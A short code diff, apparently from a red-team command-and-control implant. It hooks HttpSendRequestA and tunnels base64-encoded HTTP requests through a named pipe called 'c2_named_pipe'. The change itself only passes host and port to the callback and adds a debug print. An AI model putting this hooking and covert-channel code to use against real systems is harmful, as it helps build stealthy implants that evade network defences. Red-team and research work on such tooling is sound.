@@ -53,7 +53,7 @@
     Hopefully this is easy enough to use xD
     
  */
-static char *customCallback(const char *encodedRequest)
+static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
 {
     static const char *PIPE_NAME = "\\\\.\\pipe\\c2_named_pipe";
 
@@ -61,6 +61,7 @@ static char *customCallback(const char *encodedRequest)
     DWORD bytesWritten = 0;
     DWORD bytesRead = 0;
     DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
+    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);
 
     if (encodedRequest == NULL || reqLen == 0) {
         MSVCRT$printf("[customCallback] no request data to send\n");
@@ -1061,7 +1062,7 @@ BOOL WINAPI _HttpSendRequestA(
             DWORD reqJsonLen = (DWORD)MSVCRT$strlen(requestJson);
             char *encodedRequest = base64Encode((const BYTE *)requestJson, reqJsonLen);
             if (encodedRequest != NULL) {
-                char *encodedResponse = customCallback(encodedRequest);
+                char *encodedResponse = customCallback(encodedRequest, ctx ? ctx->host : "", ctx ? ctx->port : 0);
                 if (encodedResponse != NULL) {
                     BYTE *responseJsonBuf = NULL;
                     DWORD responseJsonLen = 0;
